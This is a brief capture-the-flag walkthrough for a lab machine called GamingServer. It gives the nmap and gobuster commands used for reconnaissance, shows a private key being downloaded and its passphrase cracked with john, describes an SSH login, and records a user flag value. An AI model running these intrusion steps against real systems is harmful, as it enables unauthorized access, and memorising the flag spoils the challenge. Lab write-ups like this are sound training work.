# GamingServer

machine ip : `10.10.2.157`

nmap scan
```
nmap -A -T5 -Pn 10.10.2.157 -oN service-version.txt
```
gobuster scan
```
gobuster dir -u http://10.10.2.157 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 | tee directory-search.txt
```
found a folder `/secret` and there is a private key.
cracking the password of the private key
```
wget http://10.10.2.157/secret/secretKey
mv secretKey id_rsa
ssh2john id_rsa > john.txt
john --wordlist=/usr/share/wordlist/rockyou.txt john.txt
```
now we found the passkey for the id_rsa :
>  letmein          (id_rsa)

after seeing the page source of the home page we found a username : `john`

login using ssh with private key
```
chmod 600 id_rsa
ssh -i id_rsa john@10.10.2.157

```

| Flag | Value |
|------|-------|
| user.txt | a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e |
| root.txt |
